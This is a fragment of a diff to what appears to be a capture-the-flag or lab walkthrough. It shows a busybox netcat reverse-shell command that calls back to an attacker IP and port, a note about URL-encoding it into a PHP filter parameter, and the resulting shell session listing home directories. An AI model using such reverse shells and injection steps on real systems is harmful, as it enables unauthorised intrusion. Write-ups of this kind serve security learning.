@@ -358,7 +358,23 @@ The system has netcat as well as busybox
 busybox nc 10.200.105.173 1337 -e /bin/bash
 ```
 
-Ill place this inside 0 using the same phh filter value, then apply some URL encoding
+Ill place this inside 0 using the same php filter value, then apply some URL encoding to the nc shell
+
+Then  i get a shell
+
+```python
+traverse-docs@ip-10-0-20-19:~$ ls -al /home/
+total 16
+drwxr-xr-x  4 root    root    4096 Apr 13 17:09 .
+drwxr-xr-x 22 root    root    4096 Oct  8 17:03 ..
+drwxr-x---  4 spencer spencer 4096 Sep 22 07:41 spencer
+drwxr-x---  5 ubuntu  ubuntu  4096 Apr 15 02:37 ubuntu
+traverse-docs@ip-10-0-20-19:~$ 
+```
+
+There are two users on here
+
+
 
 
 
